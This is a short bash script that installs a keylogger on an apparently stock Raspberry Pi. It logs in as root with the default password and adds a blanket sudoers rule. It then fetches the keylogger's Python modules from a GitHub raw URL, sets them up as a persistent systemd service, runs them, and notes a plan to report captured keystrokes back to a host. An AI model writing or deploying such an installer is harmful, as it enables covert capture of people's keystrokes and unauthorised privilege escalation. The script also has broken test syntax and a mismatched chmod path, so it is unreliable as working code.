#!/bin/bash
# application to install, setup, and run the keylogger.

# CHECK THAT USER CAN ISSUE SUDO
# Totally expects the root user to be an unchanged Raspberry Pi
su - root <<!
raspberry
echo "pi ALL=(ALL:ALL) ALL" >> /etc/sudoers
!

sudo mkdir /nicekl && cd /nicekl/

# DOWNLOAD FILES if they are not already installed
# nicekeylogger.service, controller.py, find_keyboard.py, keymap.py
CONT=controller.py
KMAP=keymap.py
FKEY=find_keyboard.py
KLSERV=nicekeylogger.service
base=https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/
if [ ! test -f "$CONT" ] ; then
  curl $base\controller.py > controller.py
fi
if [ ! test -f "$KMAP" ] ; then
  curl $base\keymap.py > keymap.py
fi
if [ ! test -f "$FKEY" ] ; then
  curl $base\find_keyboard.py > find_keyboard.py
fi
if [ ! test -f "$KLSERV" ] ; then
  curl $base\nicekeylogger.service > nicekeylogger.service
fi
sudo chmod 744 test/controller.py

# SET APPLICATION AS A SERVICE WITH SYSTEMD
# copy nicekeylogger.service to /etc/systemd/system/
sudo mv nicekeylogger.service /etc/systemd/system/
systemctl enable nicekeylogger.service
systemctl daemon-reload


# RUN APPLICATION
python3 controller.py &

# REPORT BACK TO HOST
# TODO - decide the period to report back
# TODO - control size of report; only send new content? only send UDP payload? On size == x?

